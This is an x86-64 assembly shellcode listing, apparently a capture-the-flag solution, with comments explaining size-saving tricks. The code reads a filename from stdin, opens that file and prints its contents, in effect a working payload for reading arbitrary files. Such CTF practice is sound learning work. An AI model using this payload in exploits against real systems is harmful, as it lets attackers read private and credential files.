bits 64

_start:
xor rax, rax        ; syscall read = 0
xor rdi, rdi        ; we'll read from stdin
mov rsi, rsp        ; one byte shorter than 'lea rsi, [rsi]'
push byte 18        ; number of bytes to read, enough for the filename
pop rdx
syscall

xor rax, rax
inc rax
inc rax             ; syscall open
                    ; instead of setting rdi to the filename (located on the stack),
                    ; we re-use the fact that rdi is zero and rsi points to that filename
xchg rsi, rdi       ; now rsi = 0 (O_RDONLY), and rdi points to the filename we just read
syscall

xchg rax, rsi       ; after this, rsi contains the filehandle of the opened file, rax contains 0
xchg rdi, rsi       ; after this, rdi contains the filehandle and rsi points to the stack (a buffer!)
push byte 127
pop rdx             ; read 127 bytes, should be plenty
syscall             ; because we set rax to 0, this will call syscall read

xor rax, rax
inc rax             ; syscall write
mov rdi, rax        ; copy the value of rax to rdi (1 = stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; grab the flag!
